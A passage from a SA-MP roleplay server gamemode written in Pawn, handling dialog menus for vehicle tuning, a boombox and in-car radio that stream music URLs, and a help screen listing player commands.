                    ShowPlayerDialog(playerid,1003,DIALOG_STYLE_LIST,"Choose one","Paintjob\nChrome\nSlamin\nFlame Sideskirt \nArches Sideskirt Roof\n{FF0000}Back","Select","Cancel");
				}
				else if(vehmd == 496 || vehmd == 505 || vehmd == 516 || vehmd == 517 || vehmd == 518 || vehmd == 527 || vehmd == 529 || vehmd == 540 || vehmd == 546 || vehmd == 547 || vehmd == 549 || vehmd == 550 || vehmd == 551 || vehmd == 580 || vehmd == 585 || vehmd == 587 || vehmd == 589 || vehmd == 600 || vehmd == 603 || vehmd == 401 || vehmd == 410 || vehmd == 415 || vehmd == 418 || vehmd == 420 || vehmd == 436 || vehmd == 439 || vehmd == 458 || vehmd == 489 || vehmd == 491 || vehmd == 492)
				{
					RegularCarDialog(playerid);
				}
				else
				{
					SendClientMessage(playerid,COLOR_GRAD2,"This vehicle can't be tuned.");
				}
			}
		}
	}
    if(dialogid == 1112 && response)
	{
		new color1, color2;
		GetVehicleColor(vehid,color1,color2);
	    new Carray[] = {1,0,6,2,79,149,151,3,34};
	    ChangeVehicleColor(vehid,Carray[listitem],color2);
	    if(GetPlayerVehicleID(playerid) == Player[playerid][pVeh])
		{
		    Player[playerid][vC1] = Carray[listitem];
		}
		else if(GetPlayerVehicleID(playerid) == Player[playerid][pVVeh])
		{
		    Player[playerid][vVC1] = Carray[listitem];
		}
		else if(GetPlayerVehicleID(playerid) == Player[playerid][pVVVeh])
		{
		    Player[playerid][vVVC1] = Carray[listitem];
		}
		else if(GetPlayerVehicleID(playerid) == Player[playerid][pVVVVeh])
		{
		    Player[playerid][vVVVC1] = Carray[listitem];
		}
	    return ShowPlayerDialog(playerid,1116,DIALOG_STYLE_LIST,"Choose second color:","White\nBlack\nOrange\nLight Blue\nDark Blue\nPurple\nRed\nDark Red\nGrey","Select","Cancle");
	}

	if(dialogid == 1116 && response)
	{
	    new color1, color2;
		GetVehicleColor(vehid,color1,color2);
	    new Carray[] = {1,0,6,2,79,149,151,3,34};
        ChangeVehicleColor(vehid,color1,Carray[listitem]);
        if(GetPlayerVehicleID(playerid) == Player[playerid][pVeh])
		{
		    Player[playerid][vC2] = Carray[listitem];
		}
		else if(GetPlayerVehicleID(playerid) == Player[playerid][pVVeh])
		{
		    Player[playerid][vVC2] = Carray[listitem];
		}
		else if(GetPlayerVehicleID(playerid) == Player[playerid][pVVVeh])
		{
		    Player[playerid][vVVC2] = Carray[listitem];
		}
		else if(GetPlayerVehicleID(playerid) == Player[playerid][pVVVVeh])
		{
		    Player[playerid][vVVVC2] = Carray[listitem];
		}
        return CarmodDialog(playerid);
	}
	if(dialogid == 1113 && response)
	{
	    if(listitem == 16) return CarmodDialog(playerid);
		new Warray[] = {1073,1074,1075,1076,1077,1078,1079,1080,1081,1082,1083,1084,1085,1096,1097,1098};
		AddVehicleComponent(vehid,Warray[listitem]);
		return CarmodDialog(playerid);
	}
	if(dialogid == 1114 && response)
	{
	    switch(listitem)
	    {
			case 0: ShowPlayerDialog(playerid,1115,DIALOG_STYLE_LIST,"Choose a paintjob:","Paintjob 1\nPaintjob 2\nPaintjob 3","Select","Cancel");
			case 1: Mod(playerid);
			case 2: Mod1(playerid);
			case 3: CarmodDialog(playerid);
		}
	}
	if(dialogid == 1001 && response)
	{
		switch(listitem)
		{
			case 0: ShowPlayerDialog(playerid,1115,DIALOG_STYLE_LIST,"Choose a paintjob:","Paintjob 1\nPaintjob 2\nPaintjob 3","Select","Cancel");
			case 1: Mod2(playerid);
			case 2: Mod3(playerid);
			case 3: CarmodDialog(playerid);
		}
	}
	if(dialogid  == 1002)
	{
		switch(listitem)
		{
			case 0: ShowPlayerDialog(playerid,1115,DIALOG_STYLE_LIST,"Choose a paintjob:","Paintjob 1\nPaintjob 2\nPaintjob 3","Select","Cancel");
			case 1: Mod2(playerid);
			case 2: Mod3(playerid);
			case 3:
			{
				if(vehmd == 567)//Savanna
				{
					AddVehicleComponent(vehid, 1130);
				}
				if(vehmd == 536)//Blade
                {
                    AddVehicleComponent(vehid, 1128);
				}
			}
			case 4:
			{
				if(vehmd == 567)//Savanna
				{
    				 AddVehicleComponent(vehid, 1131);
				}
				if(vehmd == 536)//Blade
                {
                    AddVehicleComponent(vehid, 1103);
				}
			}
			case 5: CarmodDialog(playerid);
		}
	}
	if(dialogid  == 1003)//Remington
	{
		switch(listitem)
		{
		    case 0:ShowPlayerDialog(playerid,1115,DIALOG_STYLE_LIST,"Choose a paintjob:","Paintjob 1\nPaintjob 2\nPaintjob 3","Select","Cancel");
		    case 1: Mod2(playerid);
			case 2: Mod3(playerid);
			case 3: AddVehicleComponent(vehid, 1122),AddVehicleComponent(vehid, 1101),ShowPlayerDialog(playerid,1003,DIALOG_STYLE_LIST,"Choose one","Paintjob\nChrome\nSlamin\nFlame Sideskirt \nArches Sideskirt Roof\n{FF0000}Back","Select","Cancel");
			case 4: AddVehicleComponent(vehid, 1106),AddVehicleComponent(vehid, 1124),ShowPlayerDialog(playerid,1003,DIALOG_STYLE_LIST,"Choose one","Paintjob\nChrome\nSlamin\nFlame Sideskirt \nArches Sideskirt Roof\n{FF0000}Back","Select","Cancel");
			case 5: CarmodDialog(playerid);
		}
	}
	if(dialogid == 1004 && response)//regular cars
	{
	    switch(listitem)
	    {
			case 0:
			{
				ShowPlayerDialog(playerid,1010,DIALOG_STYLE_LIST,"Spoiler","Pro\nWin\nDrag\nAlpha\nChamp\nRace\nWorx\nFury\n{FF0000}Back","Select","Cancel");
			}
			case 1:
			{
			    if(vehmd == 585 || vehmd == 603 || vehmd == 439 || vehmd == 458 || vehmd == 418 || vehmd == 527 || vehmd == 580)
			    {
					AddVehicleComponent(vehid, 1006);
					return RegularCarDialog(playerid);
				}
				else if(vehmd == 439 || vehmd == 458 || vehmd == 491 || vehmd == 517 ||vehmd == 547)
			    {ShowPlayerDialog(playerid,1040,DIALOG_STYLE_LIST,"Vents","Oval\nSquare\n{FF0000}Back","Select","Cancel");}
                else if(vehmd == 415)
                {
					AddVehicleComponent(vehid, 1007);
					AddVehicleComponent(vehid, 1071);
					return RegularCarDialog(playerid);
				}
                else ShowPlayerDialog(playerid,1020,DIALOG_STYLE_LIST,"Hood","Champ\nFury\nRace\nWorx\n{FF0000}Back","Select","Cancel");
			}
			case 2:
			{
			    if(vehmd == 549 || vehmd == 585 || vehmd == 603)
				{ShowPlayerDialog(playerid,1040,DIALOG_STYLE_LIST,"Vents","Oval\nSquare\n{FF0000}Back","Select","Cancel");}
				else if(vehmd == 410 || vehmd == 436 || vehmd == 439 || vehmd == 458 || vehmd == 516 || vehmd == 491 || vehmd == 517 || vehmd == 418 || vehmd == 527 || vehmd == 580)
				{
                    AddVehicleComponent(vehid, 1007);
					AddVehicleComponent(vehid, 1071);
					return RegularCarDialog(playerid);
				}
				else if(vehmd == 415 || vehmd == 547 || vehmd == 420 || vehmd == 587)
				{CarmodDialog(playerid);}
				else
				{
					AddVehicleComponent(vehid, 1006);
					return RegularCarDialog(playerid);
				}

			}
			case 3:
			{
			    if(vehmd == 549 || vehmd == 585 || vehmd == 603 || vehmd == 551 || vehmd == 492 || vehmd == 529)
			    {
					AddVehicleComponent(vehid, 1007);
					AddVehicleComponent(vehid, 1071);
					return RegularCarDialog(playerid);
				}
				else if(vehmd == 410 || vehmd == 436 || vehmd == 439 || vehmd == 458 || vehmd == 489 || vehmd == 505)
				{ShowPlayerDialog(playerid,1060,DIALOG_STYLE_LIST,"Lights","Round Fog\nSquare Fog\n{FF0000}Back","Select","Cancel");}
				else if(vehmd == 418 || vehmd == 527 || vehmd == 580 || vehmd == 491 || vehmd == 517 || vehmd == 516)
				{CarmodDialog(playerid);}
				else{ShowPlayerDialog(playerid,1040,DIALOG_STYLE_LIST,"Vents","Oval\nSquare\n{FF0000}Back","Select","Cancel");}
			}
			case 4:
			{
			    if(vehmd == 549 || vehmd == 550 || vehmd == 585 || vehmd == 603)
			    {ShowPlayerDialog(playerid,1060,DIALOG_STYLE_LIST,"Lights","Round Fog\nSquare Fog\n{FF0000}Back","Select","Cancel");}
			    else if(vehmd == 489 || vehmd == 505 || vehmd == 551 || vehmd == 492 || vehmd == 529 || vehmd == 439 || vehmd == 458 || vehmd == 410 || vehmd == 436)
			    {CarmodDialog(playerid);}
			    else
			    {
					AddVehicleComponent(vehid, 1007);
					AddVehicleComponent(vehid, 1071);
					return RegularCarDialog(playerid);
				}
			}
			case 5:
			{
				if(vehmd == 585 || vehmd == 603 || vehmd == 550 || vehmd == 549)
				{CarmodDialog(playerid);}
				else{ShowPlayerDialog(playerid,1060,DIALOG_STYLE_LIST,"Lights","Round Fog\nSquare Fog\n{FF0000}Back","Select","Cancel");}
			}
			case 6: CarmodDialog(playerid);
		}
	}
	if(dialogid == 1010 && response)
	{
		if(listitem == 8) return RegularCarDialog(playerid);
		new Xarray[] = {1000,1001,1002,1003,1014,1015,1016,1023};
		AddVehicleComponent(vehid, Xarray[listitem]);
		return RegularCarDialog(playerid);
	}
	if(dialogid == 1020 && response)
	{
		if(listitem == 4) return RegularCarDialog(playerid);
		new Xarray[] = {1004,1005,1011,1012};
		AddVehicleComponent(vehid, Xarray[listitem]);
		return RegularCarDialog(playerid);
	}
	if(dialogid == 1040 && response)
	{
	    switch(listitem)
	    {
			case 0:
			{
				AddVehicleComponent(vehid, 1142);
				AddVehicleComponent(vehid, 1143);
				return RegularCarDialog(playerid);
			}
			case 1:
			{
				AddVehicleComponent(vehid, 1144);
				AddVehicleComponent(vehid, 1145);
				return RegularCarDialog(playerid);
			}
			case 2: RegularCarDialog(playerid);
		}
	}
	if(dialogid == 1060 && response)
	{
		if(listitem == 2) return RegularCarDialog(playerid);
		new Xarray[] = {1013,1024};
		AddVehicleComponent(vehid, Xarray[listitem]);
		return RegularCarDialog(playerid);
	}
	if(dialogid == 1115 && response)
	{
	    if(listitem == 3) return CarmodDialog(playerid);
		new Parray[] = {0,1,2};
		ChangeVehiclePaintjob(vehid, Parray[listitem]);
		return CarmodDialog(playerid);
	}
	if(dialogid == 1511 && response)
	{
	    if(listitem == 7) return ShowPlayerDialog(playerid,1114,DIALOG_STYLE_LIST,"Choose one","Paintjob\nAlien\nX-Flow\n{FF0000}Back","Select","Cancel");
		if(vehmd == 558)//Uranus
		{
			new Varray[] = {1090,1094,1092,1088,1164,1166,1168};
	 		AddVehicleComponent(vehid,Varray[listitem]);
	 		return Mod(playerid);
		}
		if(vehmd == 559)//Jester
		{
            new Varray[] = {1069,1071,1065,1067,1162,1160,1159};
	 		AddVehicleComponent(vehid,Varray[listitem]);
	 		return Mod(playerid);
		}
		if(vehmd == 560)//Sultan
		{
            new Varray[] = {1026,1027,1028,1032,1138,1169,1141};
	 		AddVehicleComponent(vehid,Varray[listitem]);
	 		return Mod(playerid);
		}
		if(vehmd == 561)//Stratum
		{
            new Varray[] = {1056,1062,1064,1055,1058,1155,1154};
	 		AddVehicleComponent(vehid,Varray[listitem]);
	 		return Mod(playerid);
		}
		if(vehmd == 562)//Elegy
		{
            new Varray[] = {1036,1040,1034,1038,1147,1171,1149};
	 		AddVehicleComponent(vehid,Varray[listitem]);
	 		return Mod(playerid);
		}
		if(vehmd == 565)//Flash
		{
            new Varray[] = {1047,1051,1046,1054,1049,1153,1150};
	 		AddVehicleComponent(vehid,Varray[listitem]);
	 		return Mod(playerid);
		}
	}
	if(dialogid == 1512 && response)
	{
	    if(listitem == 7) return ShowPlayerDialog(playerid,1114,DIALOG_STYLE_LIST,"Choose one","Paintjob\nAlien\nX-Flow\n{FF0000}Back","Select","Cancel");
	    if(vehmd == 558)//Uranus
	    {
            new Varray[] = {1093,1095,1089,1091,1163,1165,1167};
	 		AddVehicleComponent(vehid,Varray[listitem]);
	 		return Mod1(playerid);
		}
	    if(vehmd == 559)//Jester
	    {
            new Varray[] = {1070,1072,1066,1068,1158,1173,1161};
	 		AddVehicleComponent(vehid,Varray[listitem]);
	 		return Mod1(playerid);
		}
	    if(vehmd == 560)//Sultan
	    {
            new Varray[] = {1031,1030,1029,1033,1139,1170,1140};
	 		AddVehicleComponent(vehid,Varray[listitem]);
	 		return Mod1(playerid);
		}
	    if(vehmd == 561)//Stratum
	    {
            new Varray[] = {1057,1063,1059,1061,1060,1157,1156};
	 		AddVehicleComponent(vehid,Varray[listitem]);
	 		return Mod1(playerid);
		}
	    if(vehmd == 562)//Elegy
	    {
            new Varray[] = {1039,1041,1037,1035,1146,1172,1148};
	 		AddVehicleComponent(vehid,Varray[listitem]);
	 		return Mod1(playerid);
		}
	    if(vehmd == 565)//Flash
	    {
            new Varray[] = {1048,1052,1045,1053,1050,1152,1151};
	 		AddVehicleComponent(vehid,Varray[listitem]);
	 		return Mod1(playerid);
		}
	}
	if(dialogid == 1513 && response)
	{
		if(vehmd == 576)
        {
			if(listitem == 5) return Lowrider(playerid);
      		new Varray[] = {1134,1137,1136,1191,1192};
			AddVehicleComponent(vehid,Varray[listitem]);
			return Mod2(playerid);
		}
		if(vehmd == 575)
		{
			if(listitem == 5) return Lowrider(playerid);
  			new Varray[] = {1042,1099,1044,1174,1176};
			AddVehicleComponent(vehid,Varray[listitem]);
	 		return Mod2(playerid);
		}
		if(vehmd == 535)
		{
  			if(listitem == 6) return Lowrider(playerid);
  			new Varray[] = {1115,1109,1113,1117,1118,1120};
			AddVehicleComponent(vehid,Varray[listitem]);
			return Mod2(playerid);
		}
		if(vehmd == 567)
		{
		    if(listitem == 5) return Lowrider(playerid);
			new Varray[] = {1129,1133,1102,1187,1189};
			AddVehicleComponent(vehid,Varray[listitem]);
			return Mod2(playerid);
		}
		if(vehmd == 536)
		{
		    if(listitem == 5) return Lowrider(playerid);
			new Varray[] = {1104,1108,1107,1184,1182};
			AddVehicleComponent(vehid,Varray[listitem]);
			return Mod2(playerid);
		}
		if(vehmd == 534)
		{
		    if(listitem == 6) return Lowrider(playerid);
			new Varray[] = {1100,1123,1125,1126,1179,1180};
			AddVehicleComponent(vehid,Varray[listitem]);
			return Mod2(playerid);
		}
	}
	if(dialogid == 1514 && response)
	{
		if(vehmd == 576)
		{
		    if(listitem == 3) return Lowrider(playerid);
  			new Varray[] = {1135,1190,1193};
			AddVehicleComponent(vehid,Varray[listitem]);
			return Mod3(playerid);
		}
		if(vehmd == 575)
		{
		    if(listitem == 3) return Lowrider(playerid);
  			new Varray[] = {1177,1175,1043};
			AddVehicleComponent(vehid,Varray[listitem]);
			return Mod3(playerid);
		}
		if(vehmd == 535)
		{
		    if(listitem == 5) return Lowrider(playerid);
  			new Varray[] = {1110,1116,1114,1119,1121};
			AddVehicleComponent(vehid,Varray[listitem]);
			return Mod3(playerid);
		}
  		if(vehmd == 567)
		{
		    if(listitem == 3) return Lowrider(playerid);
			new Varray[] = {1188,1186,1132};
			AddVehicleComponent(vehid,Varray[listitem]);
			return Mod3(playerid);
		}
		if(vehmd == 536)
		{
		    if(listitem == 3) return Lowrider(playerid);
			new Varray[] = {1181,1183,1105};
			AddVehicleComponent(vehid,Varray[listitem]);
			return Mod3(playerid);
		}
		if(vehmd == 534)
		{
		    if(listitem == 3) return Lowrider(playerid);
			new Varray[] = {1185,1178,1127};
			AddVehicleComponent(vehid,Varray[listitem]);
			return Mod3(playerid);
		}
	}
	if(dialogid == DIALOG_BOOMBOX)
		{
 		if(!response)
 			{
				SendClientMessage(playerid, COLOR_WHITE, "You stopped changing the settings on your boombox");
  				return 1;
   			}
    		switch(listitem)
				{
 				case 0:
  				{
   					ShowPlayerDialog(playerid,DIALOG_BOOMBOX1,DIALOG_STYLE_LIST,"Boombox","ChargedUp\nCharHitz","Select","Cancel");
     			}
        		case 1:
          		{
            		ShowPlayerDialog(playerid,DIALOG_BOOMBOX2,DIALOG_STYLE_INPUT, "Boombox Input song name with .mp3", "Please put a Music URL to play the Music", "Play", "Cancel");
              	}
               	case 2:
                {
   					if(GetPVarType(playerid, "BBArea"))
        				{
            				new string[128];
                   			format(string, sizeof(string), "* %s has turned off their boombox.", GetName(playerid));
                      		SendNearbyMessageBB(playerid, 15, string, COLOR_RED, COLOR_RED, COLOR_RED, COLOR_RED, COLOR_RED);
                      		foreach(Player, i)
                        		{
                                if(IsPlayerInDynamicArea(i, GetPVarInt(playerid, "BBArea")))
                                    {
                                        StopStream(i);
                                    }
                                }
                                DeletePVar(playerid, "BBStation");
                            }
                            SendClientMessage(playerid, COLOR_WHITE, "You've turn off your boombox");
                        }
       			 	}
			return 1;
        }
        if(dialogid == DIALOG_BOOMBOX1)
        {
            if(!response)
            {
            	ShowPlayerDialog(playerid,DIALOG_BOOMBOX,DIALOG_STYLE_LIST,"Boombox","Pop\nEnter URL\nTurn Off Boombox","Select", "Cancel");
            }
            if(response)
        	{
            	if(listitem == 0)
            		{
            		if(GetPVarType(playerid, "PlacedBB"))
              			{
                 			foreach(Player, i)
                    			{
               					if(IsPlayerInDynamicArea(i, GetPVarInt(playerid, "BBArea")))
               					{
                    				PlayStream(i, "http://game.us-roleplay.com/music/charged.up", GetPVarFloat(playerid, "BBX"), GetPVarFloat(playerid, "BBY"), GetPVarFloat(playerid, "BBZ"), 30.0, 1);
                     			}
                    		}
                      		SetPVarString(playerid, "BBStation", "http://game.us-roleplay.com/music/charged.up");
                        }
                 	}
				if(listitem == 1)
            		{
                	if(GetPVarType(playerid, "PlacedBB"))
                                {
                                foreach(Player, i)
                                	{
                                 	if(IsPlayerInDynamicArea(i, GetPVarInt(playerid, "BBArea")))
                                  		{
                                    		PlayStream(i, "http://yp.shoutcast.com/sbin/tunein-station.pls?id=31645", GetPVarFloat(playerid, "BBX"), GetPVarFloat(playerid, "BBY"), GetPVarFloat(playerid, "BBZ"), 30.0, 1);
                                      	}
                                 	}
                                 SetPVarString(playerid, "BBStation", "http://yp.shoutcast.com/sbin/tunein-station.pls?id=31645");
							}
                        }
                	}
       			return 1;
			}
			if(dialogid == DIALOG_BOOMBOX2)//SURL SHIT
			{
			if(response == 1)
				{
				if(isnull(inputtext))
					{
						SendClientMessage(playerid, COLOR_WHITE, "You did not enter anything" );
						return 1;
 					}
  					if(strlen(inputtext))
 						{
						if(GetPVarType(playerid, "PlacedBB"))
								{
   								foreach(Player, i)
        							{
          							if(IsPlayerInDynamicArea(i, GetPVarInt(playerid, "BBArea")))
            							{
             								PlayStream(i, inputtext, GetPVarFloat(playerid, "BBX"), GetPVarFloat(playerid, "BBY"), GetPVarFloat(playerid, "BBZ"), 30.0, 1);
           								}
									}
								SetPVarString(playerid, "BBStation", inputtext);
 								}
  							}
						}
  					else
    				{
     					return 1;
       				}
		return 1;
	}
		/*if(dialogid == 2468)
		{
	    	new vehicleradioid = GetPlayerVehicleID(playerid);
	    	if(response)
				{
				switch(listitem)
					{
			    	case 0:
		    		{
      					new string[128];
		    			if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_WHITE, "{FFFFFF}You are not in a vehicle and therefore cannot use the radio.");
		    			PlayAudioStreamForPlayer(playerid, "http://54.210.120.244:8000/listen.pls?sid=1");
				    	format(string, sizeof(string), "* %s extends their arm towards the radio, pressing the tracking buttons to tune into LA News Network.", RPIP(playerid));
						SendClientMessage(playerid, 0x33CCFFAA, "RADIO: {FFFFFF}You tuned into LA News Network");
			    	}
			   	 	case 1:
       				{
			    		ShowPlayerDialog(playerid, 2469, DIALOG_STYLE_LIST, "Talk Stations", "LATalk", "Play", "Cancel");
			    		if(dialogid == 2469)
			    			{
			        			switch(listitem)
       								{
			            			case 0:
			            			{
										if(vehicleradioid)
											{
								    		for(new i; i < MAX_PLAYERS; ++i)
								    			{
            									if(!IsPlayerConnected(i))continue;
            									if(IsPlayerInVehicle(i, vehicleradioid))
            										{
            							    			new string[128];
														PlayAudioStreamForPlayer(i, "http://54.210.120.244:8000/listen.pls?sid=2");
														format(string, sizeof(string), "* %s extends their arm towards the radio, pressing the tracking buttons to tune into LATalk.", RPIP(playerid));
														SendClientMessage(i, 0x33CCFFAA, "RADIO: {FFFFFF}You tuned into LATalk");
													}
												}
											}
										}
									}
								}
			    			}
			    			case 2:
			    			{
			        			ShowPlayerDialog(playerid, 2470, DIALOG_STYLE_LIST, "Dance Stations", "Dance.FM\nChartHits.FM\n#MUSIK.CLUB", "Play", "Cancel");
			        			if(dialogid == 2470)
			        				{
			          	  				switch(listitem)
			            					{
			                				case 0:
			                				{
			                    				if(vehicleradioid)
			                    					{
			                        					for(new i; i < MAX_PLAYERS; ++i)
			                        						{
                           									if(!IsPlayerConnected(i))continue;
			                            					if(IsPlayerInVehicle(i, vehicleradioid))
																{
										    						new string[128];
										    						PlayAudioStreamForPlayer(i, "http://dance.fm/mp3.pls");
										    						format(string, sizeof(string), "* %s extends their arm towards the radio, pressing the tracking buttons to tune into Dance.FM.", RPIP(playerid));
										    						SendClientMessage(i, 0x33CCFFAA, "RADIO: {FFFFFF}You tuned into Dance.FM");
																}
													}
											}
											}
										}
									}
									case 1:
									{
										if(vehicleradioid)
											{
				    							for(new i; i < MAX_PLAYERS; ++i)
								    				{
								        				if(!IsPlayerConnected(i))continue;
								        				if(IsPlayerInVehicle(i, vehicleradioid))
								        {
								            new string[128];
								            PlayAudioStreamForPlayer(i, "http://yp.shoutcast.com/sbin/tunein-station.pls?id=31645");
								            format(string, sizeof(string), "* %s extends their arm towards the radio, pressing the tracking buttons to tune into ChartHits.FM.", RPIP(playerid));
								            SendClientMessage(i, 0x33CCFFAA, "RADIO: {FFFFFF}You tuned into ChartHits.FM");
										}
									}
								}
							}
							case 2:
							{
							    if(vehicleradioid)
							    {
							        for(new i; i < MAX_PLAYERS; ++i)
							        {
							            if(!IsPlayerConnected(i))continue;

							            if(IsPlayerInVehicle(i, vehicleradioid))
							            {
							                new string[128];
								            PlayAudioStreamForPlayer(i, "http://yp.shoutcast.com/sbin/tunein-station.pls?id=17998");
								            format(string, sizeof(string), "* %s extends their arm towards the radio, pressing the tracking buttons to tune into #MUSIK.CLUB.", RPIP(playerid));
								            SendClientMessage(i, 0x33CCFFAA, "RADIO: {FFFFFF}You tuned into #MUSIK.CLUB");
										}
									}
								}
							}
						}
					}
				}
				case 3:
				{
				    ShowPlayerDialog(playerid, 2471, DIALOG_STYLE_LIST, "Rock Stations", "1.FM Rock Classics\nThe Zone - Modern Rock Radio\n", "Play", "Cancel");
				    if(dialogid == 2471)
				    {
						switch(listitem)
						{
						    case 0:
						    {
						        if(vehicleradioid)
						        {
						            for(new i; i < MAX_PLAYERS; ++i)
						            {
						                if(!IsPlayerConnected(i))continue;

						                if(IsPlayerInVehicle(i, vehicleradioid))
						                {
						                    new string[128];
						                    PlayAudioStreamForPlayer(i, "http://yp.shoutcast.com/sbin/tunein-station.pls?id=96567");
						                    format(string, sizeof(string), "* %s extends their arm towards the radio, pressing the tracking buttons to tune into 1.FM Rock Classics.", RPIP(playerid));
						                    SendClientMessage(i, 0x33CCFFAA, "RADIO: {FFFFFF}You tuned into 1.FM Rock Classics");
										}
									}
								}
							}
							case 1:
							{
							    if(vehicleradioid)
						        {
						            for(new i; i < MAX_PLAYERS; ++i)
						            {
						                if(!IsPlayerConnected(i))continue;

						                if(IsPlayerInVehicle(i, vehicleradioid))
						                {
						                    new string[128];
						                    PlayAudioStreamForPlayer(i, "http://www.internet-radio.com/servers/tools/playlistgenerator/?u=http://uk1.internet-radio.com:15763/listen.pls&t=.pls");
						                    format(string, sizeof(string), "* %s extends their arm towards the radio, pressing the tracking buttons to tune into The Zone - Modern Rock Radio.", RPIP(playerid));
						                    SendClientMessage(i, 0x33CCFFAA, "RADIO: {FFFFFF}You tuned into The Zone - Modern Rock Radio");
										}
									}
								}
							}
                            case 2:
							{
							    if(vehicleradioid)
						        {
						            for(new i; i < MAX_PLAYERS; ++i)
						            {
						                if(!IsPlayerConnected(i))continue;
						                if(IsPlayerInVehicle(i, vehicleradioid))
						                {
						                    new string[128];
						                    PlayAudioStreamForPlayer(i, "http://www.internet-radio.com/servers/tools/playlistgenerator/?u=http://uk2.internet-radio.com:30092/listen.pls&t=.pls");
						                    format(string, sizeof(string), "* %s extends their arm towards the radio, pressing the tracking buttons to tune into Gold FM.", RPIP(playerid));
						                    SendClientMessage(i, 0x33CCFFAA, "RADIO: {FFFFFF}You tuned into Gold FM");
										}
									}
								}
								if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_WHITE, "{FFFFFF}You are not in a vehicle and therefore cannot use the radio.");
    							PlayAudioStreamForPlayer(playerid, "http://yp.shoutcast.com/sbin/tunein-station.pls?id=96567");
								SendClientMessage(playerid, 0x33CCFFAA, "RADIO: {FFFFFF}Connected to 1.FM Rock Classics");
			    			}
							case 4:
							{
								if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_WHITE, "{FFFFFF}You are not in a vehicle and therefore cannot use the radio.");
								PlayAudioStreamForPlayer(playerid, "http://yp.shoutcast.com/sbin/tunein-station.pls?id=158949");
								SendClientMessage(playerid, 0x33CCFFAA, "RADIO: {FFFFFF}Connected to 1.FM Absolute Top 40");
							}
			    			case 5:
			    			{
			    				if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_WHITE, "{FFFFFF}You are not in a vehicle and therefore cannot use the radio.");
								PlayAudioStreamForPlayer(playerid, "http://yp.shoutcast.com/sbin/tunein-station.pls?id=616210");
								SendClientMessage(playerid, 0x33CCFFAA, "RADIO: {FFFFFF}Connected to Smokin' FM");
			    			}
   							case 6:
   							{
   								if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_WHITE, "{FFFFFF}You are not in a vehicle and therefore cannot use the radio.");
								PlayAudioStreamForPlayer(playerid, "http://yp.shoutcast.com/sbin/tunein-station.pls?id=211579");
								SendClientMessage(playerid, 0x33CCFFAA, "RADIO: {FFFFFF}Connected to United Beats");
   							}
   							case 7:
   							{
   								if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_WHITE, "{FFFFFF}You are not in a vehicle and therefore cannot use the radio.");
								StopAudioStreamForPlayer(playerid);
								SendClientMessage(playerid, COLOR_WHITE, "{FFFFFF}You turned off the radio.");
   							}
						}
					}
				}*/
	if(dialogid == DIALOG_HELP)
	{
		switch(response)
  		{
    		case 1:
      		{
        		switch(listitem)
          		{
	 				case 0:
	  				{
	   					new string[228];
	        			strcat(string,"General:{FFFFFF}/stats /pickup /hangup /phchange /namechange /sexchange /agechange /search /changepass /fill");
	          			strcat(string,"\nGeneral:{FFFFFF}/pay (/un)blindfold (/un)tie /colorcar /paintcar /buy /phonebook /paycheck /id /train /walkstyle");
	                   	ShowPlayerDialog(playerid,DIALOG_HELP,DIALOG_STYLE_MSGBOX,"General commands",string,"Ok", "");
	     			}
	        		case 1:
	          		{
	            		new string[228];
	        			strcat(string,"Chat:{FFFFFF}/o /b /s /l /w /wt /f /r /d /call /sms /accent");
	                   	ShowPlayerDialog(playerid,DIALOG_HELP,DIALOG_STYLE_MSGBOX,"Chat commands",string,"Ok", "");
	              	}
	               	case 2:
	                {
	              		new string[228];
	        			strcat(string,"Family:{FFFFFF}/families /quitfamily /accept family /f /adjust /usegangcookies");
	        			strcat(string,"\nFamily:{FFFFFF}/createsafe /createhq /safe /frank /finvite /funinvite /capture /points");
	                   	ShowPlayerDialog(playerid,DIALOG_HELP,DIALOG_STYLE_MSGBOX,"Family commands",string,"Ok", "");
	          		}
	               	case 3:
	                {
	              		new string[228];
	        			strcat(string,"Vehicle:{FFFFFF}/buycar /sellcartomarket /engine /lights /park /lock /locate /bonnet /tbalance /tdeposit /twithdraw");
	                   	ShowPlayerDialog(playerid,DIALOG_HELP,DIALOG_STYLE_MSGBOX,"Vehicle commands",string,"Ok", "");
	         		}
	               	case 4:
	                {
	              		new string[228];
	        			strcat(string,"Fish:{FFFFFF}/fish /fishes /sellfish /drop /fishes");
	                   	ShowPlayerDialog(playerid,DIALOG_HELP,DIALOG_STYLE_MSGBOX,"Fish commands",string,"Ok", "");
	         		}
	               	case 5:
	                {
	              		new string[228];
	        			strcat(string,"House:{FFFFFF}/buyhouse /sellhousetomarket /hdeposit /hwithdraw /lock /upgradehouse");
	                   	ShowPlayerDialog(playerid,DIALOG_HELP,DIALOG_STYLE_MSGBOX,"House commands",string,"Ok", "");
	        		}
	               	case 6:
	                {
	              		new string[228];
	        			strcat(string,"Business:{FFFFFF}/buybiz /prices /buy /vault /lock /buyproducts /bizmessage");
	                   	ShowPlayerDialog(playerid,DIALOG_HELP,DIALOG_STYLE_MSGBOX,"Business commands",string,"Ok", "");
	         		}
	               	case 7:
	                {
	              		new string[228];
	        			strcat(string,"Job:{FFFFFF}/jobhelp /skill /search 'jobname'");
	                   	ShowPlayerDialog(playerid,DIALOG_HELP,DIALOG_STYLE_MSGBOX,"Job commands",string,"Ok", "");
	         		}
	               	case 8:
	                {
	              		new string[228];
	        			strcat(string,"Faction:{FFFFFF}/factions /factionhelp");
	                   	ShowPlayerDialog(playerid,DIALOG_HELP,DIALOG_STYLE_MSGBOX,"Fish commands",string,"Ok", "");
	         		}
	               	case 9:
	                {
	              		new string[228];
	        			strcat(string,"Bank:{FFFFFF}/balance /deposit /withdraw /transfer {01A9DB}ATM: {FFFFFF} /adeposit /awithdraw");
	                   	ShowPlayerDialog(playerid,DIALOG_HELP,DIALOG_STYLE_MSGBOX,"Bank commands",string,"Ok", "");
	         		}
	               	case 10:
	                {
	              		new string[228];
	        			strcat(string,"Paintball:{FFFFFF}/startpb /joinpb /quitpb {01A9DB}Event: {FFFFFF}/joinevent /quitevent");
	                   	ShowPlayerDialog(playerid,DIALOG_HELP,DIALOG_STYLE_MSGBOX,"Paintball commands",string,"Ok", "");
	         		}
	               	case 11:
	                {
	              		new string[228];
